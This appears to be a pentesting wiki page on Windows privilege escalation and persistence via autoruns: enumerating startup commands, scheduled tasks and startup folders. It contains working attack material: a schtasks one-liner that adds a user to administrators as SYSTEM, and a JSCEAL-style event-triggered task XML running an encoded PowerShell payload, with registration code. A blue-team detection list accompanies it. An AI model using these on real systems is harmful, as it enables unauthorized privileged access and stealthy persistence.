# Privilege Escalation with Autoruns

{{#include ../../banners/hacktricks-training.md}}



## WMIC

**Wmic** can be used to run programs on **startup**. See which binaries are programmed to run is startup with:

```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```

## Scheduled Tasks

**Tasks** can be schedules to run with **certain frequency**. See which binaries are scheduled to run with:

```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```

### Event Log Triggered (EventTrigger) Scheduled Tasks

Apart from the classical **time-based** triggers, the Windows Task Scheduler can also launch tasks **when a specific event is written to any Event Log**.  This capability is exposed through the XML element `<EventTrigger>` and is extremely useful for stealthy persistence as the attacker doesn’t need to create new services or run a binary on boot.

Attackers can abuse this feature by registering a task that:

1. Uses a *very wide* filter such as `EventIDs="2-65501"` and `Levels="0,1,4,5,111"` over the *Application* log so that **almost any event will satisfy the trigger**.
2. Executes **with the highest privileges** (`<RunLevel>HighestAvailable</RunLevel>`) and under the **SYSTEM** account.
3. Launches an **encoded PowerShell command** that will run every time the trigger fires.

Example minimal XML that mimics the configuration observed in the JSCEAL campaign:

```xml
<Task version="1.6" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <EventTrigger>
      <Enabled>true</Enabled>
      <Subscription>&lt;QueryList&gt;&lt;Query Id="0" Path="Application"&gt;&lt;Select Path="Application"&gt;*[System[(Level=0 or Level=1 or Level=4 or Level=5 or Level=111) and (EventID &gt;= 2 and EventID &lt;= 65501)]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription>
    </EventTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId> <!--  SYSTEM  -->
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-EncodedCommand &lt;B64PAYLOAD&gt;</Arguments>
    </Exec>
  </Actions>
</Task>
```

Registering the task from an elevated shell:

```powershell
schtasks /Create /TN "WindowsSoftwareHealthCheckerTask" /XML eventtrigger.xml /RU SYSTEM /F
```

Or programmatically from .NET (as done in the campaign) using the **Microsoft.Win32.TaskScheduler** API:

```csharp
using (TaskService ts = new TaskService())
{
    string name = "WindowsSoftwareHealthCheckerTask";
    string xml  = File.ReadAllText("eventtrigger.xml");
    ts.GetFolder("\\").RegisterTask(name, xml, TaskCreation.CreateOrUpdate, null, null, TaskLogonType.S4U, null).Run();
}
```

This type of trigger offers several advantages for red-team / malware operations:

* **No new services/processes at boot** – execution is tied to benign log activity.
* Can **blend with normal log noise**, making detection harder.
* Runs with SYSTEM if the task XML is crafted accordingly.

Blue teams should monitor for:

* Tasks containing an `<EventTrigger>` with *very broad* filters.
* Tasks that execute PowerShell (or cmd, wscript, etc.) under SYSTEM.
* Unusual tasks registered from non-administrative contexts or recently created XML files on disk.

---

## Folders

All the binaries located in the **Startup folders are going to be executed on startup**. The common startup folders are the ones listed a continuation, but the startup folder is indicated in the registry. [Read this to learn where.](privilege-escalation-with-autorun-binaries.md#startup-path)

```bash
dir /b "C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup" 2>nul
dir /b "C:\\Documents and Settings\\%username%\\Start Menu\\Programs\\Startup" 2>nul
dir /b "%programdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" 2>nul
dir /b "%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" 2>nul
Get-ChildItem "C:\\Users\\All Users\\Start Menu\\Programs\\Startup"
Get-ChildItem "C:\\Users\\$env:USERNAME\\Start Menu\\Programs\\Startup"
```

<!-- (rest of the original file content remains unchanged) -->

## More

**Find more Autoruns like registries in** [**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)

## References

- [https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
- [https://attack.mitre.org/techniques/T1547/001/](https://attack.mitre.org/techniques/T1547/001/)
- [https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)
- [https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)
- [Sealed Chain of Deception: Actors leveraging Node.JS to Launch JSCEAL](https://research.checkpoint.com/2025/jsceal-targets-crypto-apps/)



{{#include ../../banners/hacktricks-training.md}}